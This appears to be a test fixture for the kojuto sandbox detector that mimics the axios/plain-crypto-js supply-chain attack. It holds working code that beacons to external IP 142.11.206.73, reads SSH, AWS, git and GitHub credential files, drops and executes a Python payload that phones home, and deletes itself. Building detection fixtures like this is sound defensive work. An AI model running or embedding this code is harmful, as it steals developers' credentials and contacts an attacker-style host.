/**
 * Simulates the plain-crypto-js attack pattern from the axios compromise.
 * This is NOT real malware — it reproduces the same syscall patterns
 * that kojuto should detect:
 *
 * 1. C2 connection attempt (connect to external IP)
 * 2. Credential file enumeration (openat on ~/.ssh, ~/.aws, etc.)
 * 3. Stage 2 payload write + execution (execve)
 * 4. Self-deletion (rename/unlink)
 *
 * Safe: runs inside kojuto's isolated sandbox with no network access.
 */

const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execSync } = require('child_process');

// --- Stage 1: C2 beacon (mimics sfrclak.com:8000 connection) ---
// This triggers kojuto's connect() detection.
const c2Options = {
  hostname: '142.11.206.73',
  port: 8000,
  path: '/6202033',
  method: 'POST',
  timeout: 3000,
  headers: {
    'User-Agent': 'mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)',
    'Content-Type': 'application/x-www-form-urlencoded'
  }
};

try {
  const req = http.request(c2Options, () => {});
  req.on('error', () => {}); // Expected: ETIMEDOUT in sandbox
  req.write('packages.npm.org/product0');
  req.end();
} catch (e) {}

// --- Stage 2: Credential enumeration (mimics FirstInfo recon) ---
// This triggers kojuto's openat() detection on honeypot files.
const home = os.homedir();
const sensitiveTargets = [
  path.join(home, '.ssh', 'id_rsa'),
  path.join(home, '.ssh', 'id_ed25519'),
  path.join(home, '.aws', 'credentials'),
  path.join(home, '.git-credentials'),
  path.join(home, '.config', 'gh', 'hosts.yml'),
  path.join(home, '.netrc'),
];

const stolen = {};
for (const target of sensitiveTargets) {
  try {
    stolen[target] = fs.readFileSync(target, 'utf8');
  } catch (e) {}
}

// --- Stage 3: Payload drop + execution (mimics /tmp/ld.py RAT) ---
// This triggers kojuto's execve() detection.
const payload = `
import socket, json, os, platform
info = {
    "type": "FirstInfo",
    "os": platform.system(),
    "hostname": socket.gethostname(),
    "user": os.getenv("USER", "unknown"),
}
try:
    s = socket.create_connection(("142.11.206.73", 8000), timeout=3)
    s.send(json.dumps(info).encode())
    s.close()
except:
    pass
`;

const payloadPath = '/tmp/ld.py';
try {
  fs.writeFileSync(payloadPath, payload);
  execSync('python3 ' + payloadPath, { timeout: 5000, stdio: 'ignore' });
} catch (e) {}

// --- Stage 4: Self-deletion (anti-forensics) ---
// This triggers kojuto's rename/unlink detection.
try {
  fs.unlinkSync(payloadPath);
  // Mimic the real attack's package.json swap
  fs.copyFileSync('package.json', 'package.md');
  fs.unlinkSync(__filename); // Delete setup.js itself
  fs.renameSync('package.md', 'package.json');
} catch (e) {}